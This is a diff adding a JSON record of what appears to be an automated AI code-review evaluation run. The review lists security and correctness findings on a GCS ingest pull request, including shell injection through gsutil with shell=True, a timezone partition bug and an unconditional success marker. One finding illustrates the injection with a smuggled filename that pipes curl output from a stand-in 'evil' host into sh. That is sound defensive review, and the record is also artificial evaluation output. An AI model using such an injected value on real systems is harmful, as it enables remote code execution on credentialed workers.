@@ -1,0 +1,65 @@
+{
+ "approach": "single-strong",
+ "case": "merge-07",
+ "rep": 1,
+ "wallMs": 109444,
+ "verdict": "ATTACKS",
+ "confidence": 0.93,
+ "attacks": [
+  {
+   "lens": "security",
+   "severity": "blocker",
+   "claim": "Shell command injection: gsutil is invoked via an f-string with shell=True. The local path derives from partner-chosen filenames (src.stem) and partner/dest values are also interpolated. A filename like `x;curl evil|sh;.csv` executes arbitrary commands on a worker holding GCS write credentials for the whole raw bucket.",
+   "evidence": "f\"gsutil -q -o GSUtil:parallel_composite_upload_threshold=150M cp {local} {dest}\", shell=True,  and 'Partners upload via SFTP and choose their own filenames'"
+  },
+  {
+   "lens": "security",
+   "severity": "major",
+   "claim": "Partner-controlled src.stem is used as a GCS path segment and local output filename without sanitisation, allowing odd names/collisions, and a partner could write into other path layouts. Worker credentials cover the whole bucket, so blast radius is large.",
+   "evidence": "dest = f\"gs://{BUCKET}/raw/{partner}/dt={dt}/{src_name}/{local.name}\""
+  },
+  {
+   "lens": "correctness",
+   "severity": "blocker",
+   "claim": "partition_date switched from UTC to local time (TZ=America/Los_Angeles). At the 01:30 UTC schedule, local date is the previous day, so data lands in the wrong dt partition, which downstream dashboards define as UTC date.",
+   "evidence": "-    return datetime.now(timezone.utc).strftime(\"%Y-%m-%d\")\n+    return datetime.now().strftime(\"%Y-%m-%d\")  vs. 'dt=YYYY-MM-DD partition (UTC date)' and 'TZ=America/Los_Angeles'"
+  },
+  {
+   "lens": "correctness",
+   "severity": "blocker",
+   "claim": "_SUCCESS marker is written unconditionally even when files failed (swallowed exceptions). Dashboards consume the partition as soon as the marker appears, so partial or missing data is published as complete. Partially uploaded chunks of a failed file also remain in the partition.",
+   "evidence": "except Exception: log.exception(...); failed += 1 ... write_success_marker(BUCKET, f\"raw/{partner}/dt={dt}/\")"
+  },
+  {
+   "lens": "reliability",
+   "severity": "major",
+   "claim": "Failures are only logged and counted; the task never fails or alerts when failed>0, so Airflow reports success. No cleanup of already-uploaded chunks on a mid-file failure, and retries/reruns would mix with stale chunks (no idempotency).",
+   "evidence": "log.info(\"partner=%s dt=%s ok=%d failed=%d\", ...) with no raise; 'Per-file failures no longer abort the whole partner run'"
+  },
+  {
+   "lens": "correctness",
+   "severity": "major",
+   "claim": "Local chunk files are not removed on failure, and work_dir is a new required parameter, so callers not updated will break. Also chunk filename collision across partners/files in a shared work_dir is possible. Header is derived from the first normalised row's keys, so an empty CSV yields no output silently counted as ok.",
+   "evidence": "chunk.unlink() only on success path; `def ingest_partner(partner: str, drop_dir: Path, work_dir: Path)`; `writer = csv.DictWriter(out, fieldnames=list(norm.keys()))`"
+  },
+  {
+   "lens": "correctness",
+   "severity": "minor",
+   "claim": "Rows of a file are written to multiple chunks, and the original dest layout changed from a single {stem}.csv.gz object to a {stem}/ directory of chunks, which downstream readers may not expect. Not mentioned in the PR description which says only the ingest approach changed.",
+   "evidence": "old: raw/{partner}/dt={dt}/{src.stem}.csv.gz ; new: .../{src_name}/{local.name}"
+  },
+  {
+   "lens": "evidence",
+   "severity": "minor",
+   "claim": "Performance claim for gsutil composite uploads over the client library is unsubstantiated. Composite uploads also have crc32c/compiled-crcmod caveats and gsutil is in maintenance mode. No tests included.",
+   "evidence": "'parallel composite uploads are much faster than the client library for multi-GB objects'"
+  }
+ ],
+ "usage": {
+  "calls": 1,
+  "tokIn": 3149,
+  "tokOut": 1436,
+  "usd": 0.0234732,
+  "critMs": 10124
+ }
+}
